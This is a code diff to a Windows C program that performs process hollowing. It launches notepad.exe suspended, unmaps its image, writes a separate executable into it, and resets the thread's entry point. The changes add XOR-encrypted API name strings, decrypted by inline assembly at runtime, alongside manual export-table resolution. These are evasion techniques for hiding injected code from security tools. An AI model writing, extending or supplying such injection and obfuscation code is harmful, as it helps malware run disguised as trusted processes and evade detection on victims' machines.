@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <subauth.h>
+#include "Hollow.h"
 
-#define DEBUG 
+#define DEBUG
 
 
 typedef struct BASE_RELOCATION_BLOCK {
@@ -73,12 +74,29 @@ typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATI
 typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
 typedef HANDLE(* _GetProcessHeap)();
 typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL (__stdcall *_GetThreadContext)(HANDLE hThread,LPCONTEXT lpContext);
-typedef BOOL(__stdcall* _SetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
-typedef DWORD (__stdcall * _ResumeThread)(HANDLE hThread);
+typedef BOOL (__stdcall *_GetThreadContext)(HANDLE,LPCONTEXT);
+typedef BOOL(__stdcall* _SetThreadContext)(HANDLE,LPCONTEXT);
+typedef DWORD (__stdcall * _ResumeThread)(HANDLE);
 
 
-DWORD kernel32_base, ntdll_base; 
+DWORD kernel32_base, ntdll_base;
+
+/*encrypted strings*/
+char StrCreateProcessA[] = { 0xd3,0xe2,0xf5,0xf1,0xe4,0xf5,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xd1,0 };
+char StrReadProcessMemory[] = { 0xc2,0xf5,0xf1,0xf4,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xdd,0xf5,0xfd,0xff,0xe2,0xe9,0 };
+char StrWriteProcessMemory[] = { 0xc7,0xe2,0xf9,0xe4,0xf5,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xdd,0xf5,0xfd,0xff,0xe2,0xe9,0 };
+char StrCreateFileA[] = { 0xd3,0xe2,0xf5,0xf1,0xe4,0xf5,0xd6,0xf9,0xfc,0xf5,0xd1,0 };
+char StrGetFileSize[] = { 0xd7,0xf5,0xe4,0xd6,0xf9,0xfc,0xf5,0xc3,0xf9,0xea,0xf5,0 };
+char StrRtlAllocateHeap[] = { 0xc2,0xe4,0xfc,0xd1,0xfc,0xfc,0xff,0xf3,0xf1,0xe4,0xf5,0xd8,0xf5,0xf1,0xe0,0 };
+char StrReadFile[] = { 0xc2,0xf5,0xf1,0xf4,0xd6,0xf9,0xfc,0xf5,0 };
+char StrNtQueryInformationProcess[] = { 0xde,0xe4,0xc1,0xe5,0xf5,0xe2,0xe9,0xd9,0xfe,0xf6,0xff,0xe2,0xfd,0xf1,0xe4,0xf9,0xff,0xfe,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0 };
+char StrNtUnmapViewOfSection[] = { 0xde,0xe4,0xc5,0xfe,0xfd,0xf1,0xe0,0xc6,0xf9,0xf5,0xe7,0xdf,0xf6,0xc3,0xf5,0xf3,0xe4,0xf9,0xff,0xfe,0 };
+char StrGetProcessHeap[] = { 0xd7,0xf5,0xe4,0xc0,0xe2,0xff,0xf3,0xf5,0xe3,0xe3,0xd8,0xf5,0xf1,0xe0,0 };
+char StrVirtualAllocEx[] = { 0xc6,0xf9,0xe2,0xe4,0xe5,0xf1,0xfc,0xd1,0xfc,0xfc,0xff,0xf3,0xd5,0xe8,0 };
+char StrGetThreadContext[] = { 0xd7,0xf5,0xe4,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0xd3,0xff,0xfe,0xe4,0xf5,0xe8,0xe4,0 };
+char StrSetThreadContext[] = { 0xc3,0xf5,0xe4,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0xd3,0xff,0xfe,0xe4,0xf5,0xe8,0xe4,0 };
+char StrResumeThread[] = { 0xc2,0xf5,0xe3,0xe5,0xfd,0xf5,0xc4,0xf8,0xe2,0xf5,0xf1,0xf4,0 };
+
 
 DWORD GetProcessHeapo()
 {
@@ -107,9 +125,17 @@ void Kernel32_NTdll_bases()
 }
 
 DWORD find_function_address(DWORD base , char * function_name)
-{
-
+{ 
 	__asm {
+		/*decrypt function name*/
+		mov edi , function_name
+		lopp :
+			cmp [edi],0x0
+			je resu
+			xor [edi] , 0x90
+			inc edi
+			jnz lopp
+		resu :
 		/* Virtual addresses to (exported , name , ordinal) tables*/
 		mov eax, base
 		mov edx, [eax + 0x3c] // RVA PE signature
@@ -163,14 +189,14 @@ DWORD find_function_address(DWORD base , char * function_name)
 
 
 
-int wmain()
+inline int wmain()
 {
 	Kernel32_NTdll_bases();
 	PROCESS_BASIC_INFORMATION pbi ; 
 	STARTUPINFOA blah;
 	PROCESS_INFORMATION blah1; 
 	ZeroMemory(&blah, sizeof(blah));
-	_CreateProcessA _CreateProc = find_function_address(kernel32_base, "CreateProcessA");
+	_CreateProcessA _CreateProc = find_function_address(kernel32_base, StrCreateProcessA);
 	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
 		printf("error creating this trash process bye , %d!\n",GetLastError());
 		exit(1); 
@@ -178,7 +204,7 @@ int wmain()
 	
 	HANDLE target = blah1.hProcess;
 	ULONG len;
-	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, "NtQueryInformationProcess");
+	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, StrNtQueryInformationProcess);
 	NTSTATUS status = NtQueryInformationPr(target, 0, &pbi,sizeof(pbi),&len);
 	/*	if (NT_ERROR(status)) {
 		printf("NtQuery failed !"); 
@@ -186,20 +212,20 @@ int wmain()
 	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8; 
 	LPVOID TargetImageBase = 0;
 	SIZE_T bytesRead = NULL;
-	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, "ReadProcessMemory"); 
+	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, StrReadProcessMemory); 
 	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
 #ifdef DEBUG
 	printf("[+] base address of target 0x%x\n", (DWORD)TargetImageBase); 
 #endif
 	
-	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
+	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, StrNtUnmapViewOfSection);
 #ifdef DEBUG
 	printf("[+] _NtUnmapViewOfSection @ 0x%x\n", (DWORD)NtUnmapViewOfSe);
 #endif
 	NtUnmapViewOfSe(target,TargetImageBase);
 	
 	/*source file*/
-	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
+	_CreateFileA Createfil = find_function_address(kernel32_base,StrCreateFileA);
 	
 	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\ml\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
 	if (src==INVALID_HANDLE_VALUE) {
@@ -209,14 +235,14 @@ int wmain()
 		return 0xDEADBEEF; 
 	}
 	
-	_GetFileSize GetFilesiz = find_function_address(kernel32_base, "GetFileSize");
+	_GetFileSize GetFilesiz = find_function_address(kernel32_base, StrGetFileSize);
 	DWORD srcSize = GetFilesiz(src, NULL);
 	LPDWORD BytesRead = 0;
-	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base , "RtlAllocateHeap");
+	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base ,StrRtlAllocateHeap);
 #ifdef DEBUG
 	printf("[+] RtlAllocateHeap address @ 0x%x\n", (DWORD)RtlAllocateH);
 #endif
-	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, "GetProcessHeap");
+	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, StrGetProcessHeap);
 #ifdef DEBUG
 	printf("[+] GetProcessHea address @ 0x%x\n", (DWORD)GetProcessHea);  
 #endif
@@ -225,7 +251,7 @@ int wmain()
 	printf("[+] address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
 #endif
 	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
-	_ReadFile ReadFil = find_function_address(kernel32_base, "ReadFile");
+	_ReadFile ReadFil = find_function_address(kernel32_base, StrReadFile);
 	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
 	CloseHandle(src);
 
@@ -245,7 +271,10 @@ int wmain()
 	The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
 	If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
 	*/
-	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, "VirtualAllocEx");
+	/*
+	My approach here is to keep trying (kill the create process and recall main), be carefull if this operation gets in an inifinite loop , it will crush the program (since the stack is limited)
+	*/
+	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, StrVirtualAllocEx);
 #ifdef DEBUG
 	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
 #endif	
@@ -268,7 +297,7 @@ int wmain()
 	srcNtHeaders->OptionalHeader.ImageBase = TargetImageBase;
 	/*copying headers*/
 	
-	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,"WriteProcessMemory");
+	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,StrWriteProcessMemory);
 	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
  
 	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
@@ -345,9 +374,9 @@ int wmain()
 		
 		CONTEXT ctx ;
 		ctx.ContextFlags = CONTEXT_INTEGER;
-		_GetThreadContext GetThreadCont = find_function_address(kernel32_base, "GetThreadContext"); 
-		_SetThreadContext SetThreadCont = find_function_address(kernel32_base, "SetThreadContext");
-		_ResumeThread ResumeThrea = find_function_address(kernel32_base, "ResumeThread"); 
+		_GetThreadContext GetThreadCont = find_function_address(kernel32_base, StrGetThreadContext); 
+		_SetThreadContext SetThreadCont = find_function_address(kernel32_base, StrSetThreadContext);
+		_ResumeThread ResumeThrea = find_function_address(kernel32_base, StrResumeThread); 
 		GetThreadCont(blah1.hThread, &ctx);
 		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
 #ifdef DEBUG
